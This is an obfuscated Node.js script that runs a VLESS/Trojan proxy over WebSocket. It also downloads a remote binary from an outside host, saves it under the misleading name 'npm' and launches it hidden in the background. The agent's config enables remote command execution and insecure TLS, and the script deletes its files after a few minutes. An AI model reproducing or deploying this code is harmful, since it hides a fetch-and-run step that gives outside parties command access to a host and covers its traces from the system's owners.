const _0x4dfcad=_0x3805;(function(_0x3fa4ef,_0x23c663){const _0xc79ea8=_0x3805,_0x1c4293=_0x3fa4ef();while(!![]){try{const _0x21206b=-parseInt(_0xc79ea8(0x146))/0x1+parseInt(_0xc79ea8(0x161))/0x2*(-parseInt(_0xc79ea8(0x152))/0x3)+-parseInt(_0xc79ea8(0x160))/0x4+-parseInt(_0xc79ea8(0x17e))/0x5+-parseInt(_0xc79ea8(0x14b))/0x6*(parseInt(_0xc79ea8(0x155))/0x7)+parseInt(_0xc79ea8(0x130))/0x8+parseInt(_0xc79ea8(0x178))/0x9;if(_0x21206b===_0x23c663)break;else _0x1c4293['push'](_0x1c4293['shift']());}catch(_0x2e816d){_0x1c4293['push'](_0x1c4293['shift']());}}}(_0x1610,0xe8f25));const os=require('os'),http=require(_0x4dfcad(0x169)),fs=require('fs'),axios=require(_0x4dfcad(0x16c)),net=require('net'),path=require('path'),crypto=require(_0x4dfcad(0x128)),{Buffer}=require(_0x4dfcad(0x168)),{exec,execSync}=require(_0x4dfcad(0x194)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x4dfcad(0x133)][_0x4dfcad(0x19b)]||'33d836c9-2fc0-46d1-829b-ac3161eb624d',NEZHA_SERVER=process[_0x4dfcad(0x133)][_0x4dfcad(0x199)]||'',NEZHA_PORT=process[_0x4dfcad(0x133)][_0x4dfcad(0x149)]||'',NEZHA_KEY=process['env'][_0x4dfcad(0x18a)]||'',DOMAIN=process['env'][_0x4dfcad(0x1a1)]||_0x4dfcad(0x19c),AUTO_ACCESS=process[_0x4dfcad(0x133)][_0x4dfcad(0x13d)]||!![],WSPATH=process[_0x4dfcad(0x133)][_0x4dfcad(0x13c)]||UUID[_0x4dfcad(0x189)](0x0,0x8),SUB_PATH=process['env'][_0x4dfcad(0x129)]||_0x4dfcad(0x145),NAME=process[_0x4dfcad(0x133)][_0x4dfcad(0x15e)]||_0x4dfcad(0x150),PORT=process['env']['PORT']||0x1eb4;let ISP='';function _0x3805(_0x46aaba,_0x4632dc){_0x46aaba=_0x46aaba-0x126;const _0x16100f=_0x1610();let _0x3805d5=_0x16100f[_0x46aaba];return _0x3805d5;}function _0x1610(){const _0x11ca98=['utf-8','application/dns-json','NEZHA_PORT','&fp=chrome&type=ws&host=','318YTIeAK','https://amd64.ssss.nyc.mn/agent','writeHead','close','Answer','Hug','message','14175yknlju','decode','arm64','156072sjNVia','includes','trim','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','readFile','listen','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Server\x20is\x20running\x20on\x20port\x20','NAME','writeFileSync','6769944IFRwiN','46WTkQSA','https://speed.cloudflare.com/meta','map','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','readUInt16BE','asOrganization','npm\x20download\x20successfully','buffer','http','test','every','axios','length','get','https://arm64.ssss.nyc.mn/agent','2053','\x20-p\x20','&path=%2F','update','https://dns.google/resolve?name=','pipe','https://oooo.serv00.net/add-url','arm','27246645UetdEX','concat','find','Unknown','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','createHash','943050oUOJZh','error','url','8443','aarch64','application/json','write','unlink','arch','https://','from','slice','NEZHA_KEY','npm\x20running\x20error:','text/html','\x20with\x20all\x20DNS\x20servers','npm\x20is\x20already\x20running,\x20skip\x20running...','log','2083','config.yaml','send','Status','child_process','Failed\x20to\x20resolve\x20','connection','substr','split','NEZHA_SERVER','Hello\x20world!','UUID','1234.abc.com','text/plain','Automatic\x20Access\x20Task\x20added\x20successfully','setsid\x20nohup\x20./npm\x20-s\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','DOMAIN','npm','sha224','crypto','SUB_PATH','end','then','2096','toString','error:\x20','443','11763376uxZpde','readUInt8','data','env','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','replace','1.1.1.1','index.html','trojan://','Not\x20Found\x0a','reduce','join','WSPATH','AUTO_ACCESS','catch','hex',':443?security=tls&sni=','type','connect','createServer','utf8','sub','372219dLsahY'];_0x1610=function(){return _0x11ca98;};return _0x1610();}const GetISP=async()=>{const _0x28ae01=_0x4dfcad;try{const _0x500c5a=await axios[_0x28ae01(0x16e)](_0x28ae01(0x162)),_0x4324dd=_0x500c5a[_0x28ae01(0x132)];ISP=(_0x4324dd['country']+'-'+_0x4324dd[_0x28ae01(0x166)])[_0x28ae01(0x135)](/ /g,'_');}catch(_0x4ee859){ISP=_0x28ae01(0x17b);}};GetISP();const httpServer=http[_0x4dfcad(0x143)]((_0x77d6b6,_0x392c7f)=>{const _0x5dde8f=_0x4dfcad;if(_0x77d6b6[_0x5dde8f(0x180)]==='/'){const _0x3054e3=path['join'](__dirname,_0x5dde8f(0x137));fs[_0x5dde8f(0x159)](_0x3054e3,_0x5dde8f(0x144),(_0x51bb5d,_0x2041ac)=>{const _0x3f4bed=_0x5dde8f;if(_0x51bb5d){_0x392c7f[_0x3f4bed(0x14d)](0xc8,{'Content-Type':_0x3f4bed(0x18c)}),_0x392c7f[_0x3f4bed(0x12a)](_0x3f4bed(0x19a));return;}_0x392c7f[_0x3f4bed(0x14d)](0xc8,{'Content-Type':_0x3f4bed(0x18c)}),_0x392c7f[_0x3f4bed(0x12a)](_0x2041ac);});return;}else{if(_0x77d6b6['url']==='/'+SUB_PATH){const _0x1c8474='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x5dde8f(0x14a)+DOMAIN+_0x5dde8f(0x172)+WSPATH+'#'+NAME+'-'+ISP,_0x50ecc7=_0x5dde8f(0x138)+UUID+'@'+DOMAIN+_0x5dde8f(0x140)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5dde8f(0x172)+WSPATH+'#'+NAME+'-'+ISP,_0x215136=_0x1c8474+'\x0a'+_0x50ecc7,_0x1ca019=Buffer[_0x5dde8f(0x188)](_0x215136)[_0x5dde8f(0x12d)]('base64');_0x392c7f[_0x5dde8f(0x14d)](0xc8,{'Content-Type':_0x5dde8f(0x19d)}),_0x392c7f['end'](_0x1ca019+'\x0a');}else _0x392c7f[_0x5dde8f(0x14d)](0x194,{'Content-Type':_0x5dde8f(0x19d)}),_0x392c7f['end'](_0x5dde8f(0x139));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x4dfcad(0x136)];function resolveHost(_0x505634){return new Promise((_0x58a848,_0x10e12f)=>{const _0x1c0146=_0x3805;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1c0146(0x16a)](_0x505634)){_0x58a848(_0x505634);return;}let _0x233f20=0x0;function _0x41295b(){const _0x4b8847=_0x1c0146;if(_0x233f20>=DNS_SERVERS[_0x4b8847(0x16d)]){_0x10e12f(new Error(_0x4b8847(0x195)+_0x505634+_0x4b8847(0x18d)));return;}const _0x123d00=DNS_SERVERS[_0x233f20];_0x233f20++;const _0x37cecb=_0x4b8847(0x174)+encodeURIComponent(_0x505634)+'&type=A';axios[_0x4b8847(0x16e)](_0x37cecb,{'timeout':0x1388,'headers':{'Accept':_0x4b8847(0x148)}})[_0x4b8847(0x12b)](_0x51e439=>{const _0x521297=_0x4b8847,_0x2989d4=_0x51e439[_0x521297(0x132)];if(_0x2989d4[_0x521297(0x193)]===0x0&&_0x2989d4[_0x521297(0x14f)]&&_0x2989d4[_0x521297(0x14f)][_0x521297(0x16d)]>0x0){const _0x49404f=_0x2989d4[_0x521297(0x14f)][_0x521297(0x17a)](_0x1593dd=>_0x1593dd[_0x521297(0x141)]===0x1);if(_0x49404f){_0x58a848(_0x49404f['data']);return;}}_0x41295b();})[_0x4b8847(0x13e)](_0x4770a7=>{_0x41295b();});}_0x41295b();});}function handleVlessConnection(_0x35c7cc,_0x3fe910){const _0x5a097b=_0x4dfcad,[_0x58fe24]=_0x3fe910,_0x563f56=_0x3fe910['slice'](0x1,0x11);if(!_0x563f56['every']((_0x3b3f1b,_0xad0815)=>_0x3b3f1b==parseInt(uuid[_0x5a097b(0x197)](_0xad0815*0x2,0x2),0x10)))return![];let _0x5965c3=_0x3fe910['slice'](0x11,0x12)[_0x5a097b(0x131)]()+0x13;const _0x1ff1cb=_0x3fe910[_0x5a097b(0x189)](_0x5965c3,_0x5965c3+=0x2)[_0x5a097b(0x165)](0x0),_0x56e8c7=_0x3fe910[_0x5a097b(0x189)](_0x5965c3,_0x5965c3+=0x1)['readUInt8'](),_0x1ec2f3=_0x56e8c7==0x1?_0x3fe910[_0x5a097b(0x189)](_0x5965c3,_0x5965c3+=0x4)[_0x5a097b(0x13b)]('.'):_0x56e8c7==0x2?new TextDecoder()[_0x5a097b(0x153)](_0x3fe910[_0x5a097b(0x189)](_0x5965c3+0x1,_0x5965c3+=0x1+_0x3fe910['slice'](_0x5965c3,_0x5965c3+0x1)[_0x5a097b(0x131)]())):_0x56e8c7==0x3?_0x3fe910[_0x5a097b(0x189)](_0x5965c3,_0x5965c3+=0x10)[_0x5a097b(0x13a)]((_0x815c8,_0x341ba9,_0x10c079,_0x48ebd8)=>_0x10c079%0x2?_0x815c8[_0x5a097b(0x179)](_0x48ebd8[_0x5a097b(0x189)](_0x10c079-0x1,_0x10c079+0x1)):_0x815c8,[])['map'](_0x100a64=>_0x100a64['readUInt16BE'](0x0)['toString'](0x10))[_0x5a097b(0x13b)](':'):'';_0x35c7cc[_0x5a097b(0x192)](new Uint8Array([_0x58fe24,0x0]));const _0x3a7b94=createWebSocketStream(_0x35c7cc);return resolveHost(_0x1ec2f3)[_0x5a097b(0x12b)](_0x19dd82=>{const _0x2996d0=_0x5a097b;net[_0x2996d0(0x142)]({'host':_0x19dd82,'port':_0x1ff1cb},function(){const _0x202f11=_0x2996d0;this['write'](_0x3fe910[_0x202f11(0x189)](_0x5965c3)),_0x3a7b94['on'](_0x202f11(0x17f),()=>{})['pipe'](this)['on'](_0x202f11(0x17f),()=>{})[_0x202f11(0x175)](_0x3a7b94);})['on'](_0x2996d0(0x17f),()=>{});})[_0x5a097b(0x13e)](_0xdd87ef=>{const _0x10b6d7=_0x5a097b;net['connect']({'host':_0x1ec2f3,'port':_0x1ff1cb},function(){const _0x246be4=_0x3805;this[_0x246be4(0x184)](_0x3fe910[_0x246be4(0x189)](_0x5965c3)),_0x3a7b94['on'](_0x246be4(0x17f),()=>{})[_0x246be4(0x175)](this)['on']('error',()=>{})[_0x246be4(0x175)](_0x3a7b94);})['on'](_0x10b6d7(0x17f),()=>{});}),!![];}function handleTrojanConnection(_0x20f409,_0x937df1){const _0x6a92c7=_0x4dfcad;try{if(_0x937df1['length']<0x3a)return![];const _0x5543d2=_0x937df1[_0x6a92c7(0x189)](0x0,0x38)[_0x6a92c7(0x12d)](),_0x2b40ea=[UUID];let _0x1cf2e3=null;for(const _0x3e95a3 of _0x2b40ea){const _0xa33041=crypto[_0x6a92c7(0x17d)](_0x6a92c7(0x127))[_0x6a92c7(0x173)](_0x3e95a3)['digest'](_0x6a92c7(0x13f));if(_0xa33041===_0x5543d2){_0x1cf2e3=_0x3e95a3;break;}}if(!_0x1cf2e3)return![];let _0x3f172a=0x38;_0x937df1[_0x3f172a]===0xd&&_0x937df1[_0x3f172a+0x1]===0xa&&(_0x3f172a+=0x2);const _0x215bf4=_0x937df1[_0x3f172a];if(_0x215bf4!==0x1)return![];_0x3f172a+=0x1;const _0x46fde8=_0x937df1[_0x3f172a];_0x3f172a+=0x1;let _0x293edb,_0x949bce;if(_0x46fde8===0x1)_0x293edb=_0x937df1[_0x6a92c7(0x189)](_0x3f172a,_0x3f172a+0x4)[_0x6a92c7(0x13b)]('.'),_0x3f172a+=0x4;else{if(_0x46fde8===0x3){const _0x4c55a0=_0x937df1[_0x3f172a];_0x3f172a+=0x1,_0x293edb=_0x937df1[_0x6a92c7(0x189)](_0x3f172a,_0x3f172a+_0x4c55a0)[_0x6a92c7(0x12d)](),_0x3f172a+=_0x4c55a0;}else{if(_0x46fde8===0x4)_0x293edb=_0x937df1[_0x6a92c7(0x189)](_0x3f172a,_0x3f172a+0x10)[_0x6a92c7(0x13a)]((_0x2fa5da,_0x5dc8a0,_0x40411b,_0x9648f7)=>_0x40411b%0x2?_0x2fa5da[_0x6a92c7(0x179)](_0x9648f7[_0x6a92c7(0x189)](_0x40411b-0x1,_0x40411b+0x1)):_0x2fa5da,[])[_0x6a92c7(0x163)](_0x3cff83=>_0x3cff83[_0x6a92c7(0x165)](0x0)[_0x6a92c7(0x12d)](0x10))[_0x6a92c7(0x13b)](':'),_0x3f172a+=0x10;else return![];}}_0x949bce=_0x937df1[_0x6a92c7(0x165)](_0x3f172a),_0x3f172a+=0x2;_0x3f172a<_0x937df1[_0x6a92c7(0x16d)]&&_0x937df1[_0x3f172a]===0xd&&_0x937df1[_0x3f172a+0x1]===0xa&&(_0x3f172a+=0x2);const _0x313e76=createWebSocketStream(_0x20f409);return resolveHost(_0x293edb)[_0x6a92c7(0x12b)](_0x2cb832=>{const _0x5ae8fc=_0x6a92c7;net['connect']({'host':_0x2cb832,'port':_0x949bce},function(){const _0x36e11e=_0x3805;_0x3f172a<_0x937df1[_0x36e11e(0x16d)]&&this[_0x36e11e(0x184)](_0x937df1[_0x36e11e(0x189)](_0x3f172a)),_0x313e76['on'](_0x36e11e(0x17f),()=>{})[_0x36e11e(0x175)](this)['on'](_0x36e11e(0x17f),()=>{})['pipe'](_0x313e76);})['on'](_0x5ae8fc(0x17f),()=>{});})[_0x6a92c7(0x13e)](_0x424170=>{const _0x408e54=_0x6a92c7;net[_0x408e54(0x142)]({'host':_0x293edb,'port':_0x949bce},function(){const _0x3cc78a=_0x408e54;_0x3f172a<_0x937df1[_0x3cc78a(0x16d)]&&this[_0x3cc78a(0x184)](_0x937df1[_0x3cc78a(0x189)](_0x3f172a)),_0x313e76['on'](_0x3cc78a(0x17f),()=>{})['pipe'](this)['on'](_0x3cc78a(0x17f),()=>{})['pipe'](_0x313e76);})['on'](_0x408e54(0x17f),()=>{});}),!![];}catch(_0xae9cd2){return![];}}wss['on'](_0x4dfcad(0x196),(_0x430b8d,_0x298d97)=>{const _0x26bca1=_0x4dfcad,_0x3eaba2=_0x298d97['url']||'';_0x430b8d['once'](_0x26bca1(0x151),_0x5ade37=>{const _0x2f3f29=_0x26bca1;if(_0x5ade37['length']>0x11&&_0x5ade37[0x0]===0x0){const _0x193e1c=_0x5ade37['slice'](0x1,0x11),_0x2dc222=_0x193e1c[_0x2f3f29(0x16b)]((_0x229142,_0xbbb512)=>_0x229142==parseInt(uuid[_0x2f3f29(0x197)](_0xbbb512*0x2,0x2),0x10));if(_0x2dc222){!handleVlessConnection(_0x430b8d,_0x5ade37)&&_0x430b8d[_0x2f3f29(0x14e)]();return;}}!handleTrojanConnection(_0x430b8d,_0x5ade37)&&_0x430b8d[_0x2f3f29(0x14e)]();})['on'](_0x26bca1(0x17f),()=>{});});const getDownloadUrl=()=>{const _0x174514=_0x4dfcad,_0x46be32=os[_0x174514(0x186)]();return _0x46be32===_0x174514(0x177)||_0x46be32===_0x174514(0x154)||_0x46be32===_0x174514(0x182)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x174514(0x16f):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x174514(0x14c);},downloadFile=async()=>{const _0x288eaf=_0x4dfcad;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x155d8f=getDownloadUrl(),_0x4fa6ad=await axios({'method':'get','url':_0x155d8f,'responseType':'stream'}),_0x4c7ce7=fs['createWriteStream'](_0x288eaf(0x126));return _0x4fa6ad[_0x288eaf(0x132)][_0x288eaf(0x175)](_0x4c7ce7),new Promise((_0x125836,_0x76846f)=>{const _0x159c87=_0x288eaf;_0x4c7ce7['on']('finish',()=>{const _0x535ecb=_0x3805;console['log'](_0x535ecb(0x167)),exec('chmod\x20+x\x20npm',_0x240ce3=>{if(_0x240ce3)_0x76846f(_0x240ce3);_0x125836();});}),_0x4c7ce7['on'](_0x159c87(0x17f),_0x76846f);});}catch(_0x309f5){throw _0x309f5;}},runnz=async()=>{const _0x8e3447=_0x4dfcad;try{const _0x389c4d=execSync(_0x8e3447(0x134),{'encoding':_0x8e3447(0x147)});if(_0x389c4d[_0x8e3447(0x157)]()!==''){console['log'](_0x8e3447(0x18e));return;}}catch(_0x37af5a){}await downloadFile();let _0x4ee77d='',_0x3a3cca=[_0x8e3447(0x12f),_0x8e3447(0x181),_0x8e3447(0x12c),'2087',_0x8e3447(0x190),_0x8e3447(0x170)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4e3378=_0x3a3cca[_0x8e3447(0x156)](NEZHA_PORT)?'--tls':'';_0x4ee77d=_0x8e3447(0x19f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x8e3447(0x171)+NEZHA_KEY+'\x20'+_0x4e3378+_0x8e3447(0x15c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2164ca=NEZHA_SERVER[_0x8e3447(0x156)](':')?NEZHA_SERVER[_0x8e3447(0x198)](':')['pop']():'',_0x2a0cb0=_0x3a3cca['includes'](_0x2164ca)?'true':'false',_0x3c8016='client_secret:\x20'+NEZHA_KEY+_0x8e3447(0x15b)+NEZHA_SERVER+_0x8e3447(0x17c)+_0x2a0cb0+_0x8e3447(0x164)+UUID;fs[_0x8e3447(0x15f)](_0x8e3447(0x191),_0x3c8016);}_0x4ee77d=_0x8e3447(0x1a0);}else{console[_0x8e3447(0x18f)](_0x8e3447(0x158));return;}}try{exec(_0x4ee77d,{'shell':'/bin/bash'},_0x23f40a=>{const _0x7777b8=_0x8e3447;if(_0x23f40a)console[_0x7777b8(0x17f)](_0x7777b8(0x18b),_0x23f40a);else console['log']('npm\x20is\x20running');});}catch(_0x3b5c50){console[_0x8e3447(0x17f)](_0x8e3447(0x12e)+_0x3b5c50);}};async function addAccessTask(){const _0x1e9c95=_0x4dfcad;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1f53db=_0x1e9c95(0x187)+DOMAIN;try{const _0x143462=await axios['post'](_0x1e9c95(0x176),{'url':_0x1f53db},{'headers':{'Content-Type':_0x1e9c95(0x183)}});console[_0x1e9c95(0x18f)](_0x1e9c95(0x19e));}catch(_0x5b8d27){}}const delFiles=()=>{const _0x21e022=_0x4dfcad;fs['unlink'](_0x21e022(0x126),()=>{}),fs[_0x21e022(0x185)](_0x21e022(0x191),()=>{});};httpServer[_0x4dfcad(0x15a)](PORT,()=>{const _0x2ea7fc=_0x4dfcad;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2ea7fc(0x18f)](_0x2ea7fc(0x15d)+PORT);});
